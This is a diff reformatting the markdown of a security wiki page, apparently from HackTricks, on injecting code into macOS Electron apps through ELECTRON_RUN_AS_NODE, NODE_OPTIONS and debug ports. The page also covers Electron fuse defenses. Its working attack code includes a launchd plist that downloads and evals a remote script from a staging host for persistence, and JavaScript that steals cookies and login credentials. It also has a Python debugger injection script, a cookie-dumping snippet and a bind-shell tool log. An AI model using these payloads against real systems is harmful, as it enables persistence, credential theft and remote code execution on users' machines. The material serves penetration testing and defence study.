@@ -1,14 +1,13 @@
 # macOS Electron Applications Injection
 
-
 ## Basic Information
 
-If you don't know what Electron is you can find [[https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation|**lots of information here**]]. But for now just know that Electron runs **node**.\
+If you don't know what Electron is you can find [**lots of information here**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). But for now just know that Electron runs **node**.\
 And node has some **parameters** and **env variables** that can be use to **make it execute other code** apart from the indicated file.
 
 ### Electron Fuses
 
-These techniques will be discussed next, but in recent times Electron has added several **security flags to prevent them**. These are the [[https://www.electronjs.org/docs/latest/tutorial/fuses|**Electron Fuses**]] and these are the ones used to **prevent** Electron apps in macOS from **loading arbitrary code**:
+These techniques will be discussed next, but in recent times Electron has added several **security flags to prevent them**. These are the [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) and these are the ones used to **prevent** Electron apps in macOS from **loading arbitrary code**:
 
 - **`RunAsNode`**: If disabled, it prevents the use of the env var **`ELECTRON_RUN_AS_NODE`** to inject code.
 - **`EnableNodeCliInspectArguments`**: If disabled, params like `--inspect`, `--inspect-brk` won't be respected. Avoiding his way to inject code.
@@ -37,10 +36,10 @@ Fuse Version: v1
   OnlyLoadAppFromAsar is Enabled
   LoadBrowserProcessSpecificV8Snapshot is Disabled
 ```
-```
+
 ### Modifying Electron Fuses
 
-As the [[https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode|**docs mention**]], the configuration of the **Electron Fuses** are configured inside the **Electron binary** which contains somewhere the string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.
+As the [**docs mention**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), the configuration of the **Electron Fuses** are configured inside the **Electron binary** which contains somewhere the string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.
 
 In macOS applications this is typically in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
 
@@ -48,11 +47,10 @@ In macOS applications this is typically in `application.app/Contents/Frameworks/
 grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
 Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
 ```
-```
-You could load this file in [[https://hexed.it/|https://hexed.it/]] and search for the previous string. After this string you can see in ASCII a number "0" or "1" indicating if each fuse is disabled or enabled. Just modify the hex code (`0x30` is `0` and `0x31` is `1`) to **modify the fuse values**.
 
-![[../../../images/image (34).png|]]
+You could load this file in [https://hexed.it/](https://hexed.it/) and search for the previous string. After this string you can see in ASCII a number "0" or "1" indicating if each fuse is disabled or enabled. Just modify the hex code (`0x30` is `0` and `0x31` is `1`) to **modify the fuse values**.
 
+![](../../../images/image (34).png)
 
 Note that if you try to **overwrite** the **`Electron Framework` binary** inside an application with these bytes modified, the app won't run.
 
@@ -75,16 +73,16 @@ You can unpack the code from the asar file with:
 ```bash
 npx asar extract app.asar app-decomp
 ```
-```
+
 And pack it back after having modified it with:
 
 ```bash
 npx asar pack app-decomp app-new.asar
 ```
-```
+
 ## RCE with ELECTRON_RUN_AS_NODE
 
-According to [[https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node|**the docs**]], if this env variable is set, it will start the process as a normal Node.js process.
+According to [**the docs**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), if this env variable is set, it will start the process as a normal Node.js process.
 
 ```bash
 # Run this
@@ -92,38 +90,38 @@ ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
 # Then from the nodeJS console execute:
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
-```
+
 > [!CAUTION]
 > If the fuse **`RunAsNode`** is disabled the env var **`ELECTRON_RUN_AS_NODE`** will be ignored, and this won't work.
 
 ### Injection from the App Plist
 
-As [[https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/|**proposed here**]], you could abuse this env variable in a plist to maintain persistence:
+As [**proposed here**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), you could abuse this env variable in a plist to maintain persistence:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    EnvironmentVariables
+    <key>EnvironmentVariables</key>
     <dict>
-           ELECTRON\_RUN\_AS\_NODE
-           true
+           <key>ELECTRON_RUN_AS_NODE</key>
+           <string>true</string>
     </dict>
-    Label
-    com.xpnsec.hideme
-    ProgramArguments
+    <key>Label</key>
+    <string>com.xpnsec.hideme</string>
+    <key>ProgramArguments</key>
     <array>
-        /Applications/Slack.app/Contents/MacOS/Slack
-        \-e
-        const { spawn } \= require("child\_process"); spawn("osascript", \["\-l","JavaScript","\-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);
+        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
+        <string>-e</string>
+        <string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
     </array>
-    RunAtLoad
-    
+    <key>RunAtLoad</key>
+    <true/>
 </dict>
 </plist>
 ```
-```
+
 ## RCE with `NODE_OPTIONS`
 
 You can store the payload in a different file and execute it:
@@ -135,7 +133,7 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 # Execute
 NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
 ```
-```
+
 > [!CAUTION]
 > If the fuse **`EnableNodeOptionsEnvironmentVariable`** is **disabled**, the app will **ignore** the env var **NODE_OPTIONS** when launched unless the env variable **`ELECTRON_RUN_AS_NODE`** is set, which will be also **ignored** if the fuse **`RunAsNode`** is disabled.
 >
@@ -147,23 +145,23 @@ You could abuse this env variable in a plist to maintain persistence adding thes
 
 ```xml
 <dict>
-    EnvironmentVariables
+    <key>EnvironmentVariables</key>
     <dict>
-           ELECTRON\_RUN\_AS\_NODE
-           true
-           NODE\_OPTIONS
-           \-\-require /tmp/payload.js
+           <key>ELECTRON_RUN_AS_NODE</key>
+           <string>true</string>
+           <key>NODE_OPTIONS</key>
+           <string>--require /tmp/payload.js</string>
     </dict>
-    Label
-    com.hacktricks.hideme
-    RunAtLoad
-    
+    <key>Label</key>
+    <string>com.hacktricks.hideme</string>
+    <key>RunAtLoad</key>
+    <true/>
 </dict>
 ```
-```
+
 ## RCE with inspecting
 
-According to [[https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f|**this**]], if you execute an Electron application with flags such as **`--inspect`**, **`--inspect-brk`** and **`--remote-debugging-port`**, a **debug port will be open** so you can connect to it (for example from Chrome in `chrome://inspect`) and you will be able to **inject code on it** or even launch new processes.\
+According to [**this**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), if you execute an Electron application with flags such as **`--inspect`**, **`--inspect-brk`** and **`--remote-debugging-port`**, a **debug port will be open** so you can connect to it (for example from Chrome in `chrome://inspect`) and you will be able to **inject code on it** or even launch new processes.\
 For example:
 
 ```bash
@@ -171,8 +169,8 @@ For example:
 # Connect to it using chrome://inspect and execute a calculator with:
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
-```
-In [[https://hackerone.com/reports/1274695|**this blogpost**]], this debugging is abused to make a headless chrome **download arbitrary files in arbitrary locations**.
+
+In [**this blogpost**](https://hackerone.com/reports/1274695), this debugging is abused to make a headless chrome **download arbitrary files in arbitrary locations**.
 
 > [!TIP]
 > If an app has its custom way to check if env variables or params such as `--inspect` are set, you could try to **bypass** it in runtime using the arg `--inspect-brk` which will **stop the execution** at the beggining the app and execute a bypass (overwritting the args or the env variables of the current process for example).
@@ -200,14 +198,15 @@ var fs = require('fs');
 
 var wc = webContents.getAllWebContents()[0]
 
+
 function writeToFile(filePath, content) {
     const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);
 
     fs.writeFile(filePath, data, (err) => {
         if (err) {
-            console.error(`Error writing to file ${filePath}:, err);
+            console.error(`Error writing to file ${filePath}:`, err);
         } else {
-            console.log(`File written successfully at ${filePath});
+            console.log(`File written successfully at ${filePath}`);
         }
     });
 }
@@ -221,7 +220,7 @@ function get_cookies() {
             if (tokenCookie){
                 writeToFile("/tmp/cookies.txt", cookies);
                 clearInterval(intervalIdCookies);
-                wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt"));
+                wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
             }
         })
     }, 1000);
@@ -233,7 +232,7 @@ function get_creds() {
         if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
             in_location = true;
             console.log("Injecting creds logger...");
-            wc.executeJavaScript(
+            wc.executeJavaScript(`
                 (function() {
                     email = document.getElementById('login_email_id');
                     password = document.getElementById('login_password_id');
@@ -241,12 +240,12 @@ function get_creds() {
                         return email.value+":"+password.value;
                     }
                 })();
-            ).then(result => {
+            `).then(result => {
                 writeToFile("/tmp/victim_credentials.txt", result);
             })
         }
         else if (in_location) {
-            wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt"));
+            wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
             clearInterval(intervalIdCreds);
         }
     }, 10); // Check every 10ms
@@ -275,6 +274,7 @@ async def get_debugger_url():
     if not ws_url:
         raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
     INSPECT_URL = ws_url
+
 
 async def monitor_victim():
     print("Monitoring victim process...")
@@ -319,6 +319,7 @@ async def bypass_protections():
         await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
         print("Injected code to bypass protections")
 
+
 async def js_payloads():
     global CONT, CONTEXT_ID, NAME, UNIQUE_ID
 
@@ -333,6 +334,7 @@ async def js_payloads():
         await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})
 
 
+
 async def main():
     await monitor_victim()
     sleep(3)
@@ -343,6 +345,7 @@ async def main():
 
     await js_payloads()
     
+
 
 async def send_cmd(ws, method, get_first=False, params={}):
     """
@@ -376,7 +379,7 @@ async def send_cmd(ws, method, get_first=False, params={}):
 if __name__ == "__main__":
     asyncio.run(main())
 ```
-```
+
 > [!CAUTION]
 > If the fuse **`EnableNodeCliInspectArguments`** is disabled, the app will **ignore node parameters** (such as `--inspect`) when launched unless the env variable **`ELECTRON_RUN_AS_NODE`** is set, which will be also **ignored** if the fuse **`RunAsNode`** is disabled.
 >
@@ -384,7 +387,7 @@ if __name__ == "__main__":
 
 Using the param **`--remote-debugging-port=9222`** it's possible to steal some information from the Electron App like the **history** (with GET commands) or the **cookies** of the browser (as they are **decrypted** inside the browser and there is a **json endpoint** that will give them).
 
-You can learn how to do that in [[https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) and [**here**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) and use the automatic tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut|**here**]] or a simple script like:
+You can learn how to do that in [**here**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) and [**here**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) and use the automatic tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) or a simple script like:
 
 ```python
 import websocket
@@ -393,7 +396,6 @@ ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00",
 ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
 print(ws.recv()
 ```
-```
 
 ### Injection from the App Plist
 
@@ -401,18 +403,18 @@ You could abuse this env variable in a plist to maintain persistence adding thes
 
 ```xml
 <dict>
-    ProgramArguments
+    <key>ProgramArguments</key>
     <array>
-        /Applications/Slack.app/Contents/MacOS/Slack
-        \-\-inspect
+        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
+        <string>--inspect</string>
     </array>
-    Label
-    com.hacktricks.hideme
-    RunAtLoad
-    
+    <key>Label</key>
+    <string>com.hacktricks.hideme</string>
+    <key>RunAtLoad</key>
+    <true/>
 </dict>
 ```
-```
+
 ## TCC Bypass abusing Older Versions
 
 > [!TIP]
@@ -444,9 +446,9 @@ Defensive guidance from the Electron maintainers:
 
 ## Automatic Injection
 
-- [[https://github.com/r3ggi/electroniz3r|**electroniz3r**]]
+- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)
 
-The tool [[https://github.com/r3ggi/electroniz3r|**electroniz3r**]] can be easily used to **find vulnerable electron applications** installed and inject code on them. This tool will try to use the **`--inspect`** technique:
+The tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) can be easily used to **find vulnerable electron applications** installed and inject code on them. This tool will try to use the **`--inspect`** technique:
 
 You need to compile it yourself and can use it like this:
 
@@ -475,7 +477,7 @@ com.hnc.Discord                              /Applications/Discord.app
 
 /Applications/Discord.app started the debug WebSocket server
 The application is vulnerable!
-You can now kill the app using `kill -9 57739
+You can now kill the app using `kill -9 57739`
 
 # Get a shell inside discord
 ## For more precompiled-scripts check the code
@@ -483,21 +485,18 @@ You can now kill the app using `kill -9 57739
 
 /Applications/Discord.app started the debug WebSocket server
 The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
-Shell binding requested. Check `nc 127.0.0.1 12345
-```
+Shell binding requested. Check `nc 127.0.0.1 12345`
 ```
 
-- [[https://github.com/boku7/Loki|https://github.com/boku7/Loki]]
+- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)
 
 Loki was designed to backdoor Electron applications by replacing the applications JavaScript files with the Loki Command & Control JavaScript files.
 
 ## References
 
-- [[https://www.electronjs.org/docs/latest/tutorial/fuses|https://www.electronjs.org/docs/latest/tutorial/fuses]]
-- [[https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks|https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks]]
-- [[https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85|https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85]]
-- [[https://www.electronjs.org/blog/statement-run-as-node-cves|https://www.electronjs.org/blog/statement-run-as-node-cves]]
-- [[https://m.youtube.com/watch?v=VWQY5R2A6X8|https://m.youtube.com/watch?v=VWQY5R2A6X8]]
-
-
+- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
+- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
+- [https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
+- [https://www.electronjs.org/blog/statement-run-as-node-cves](https://www.electronjs.org/blog/statement-run-as-node-cves)
+- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)
 
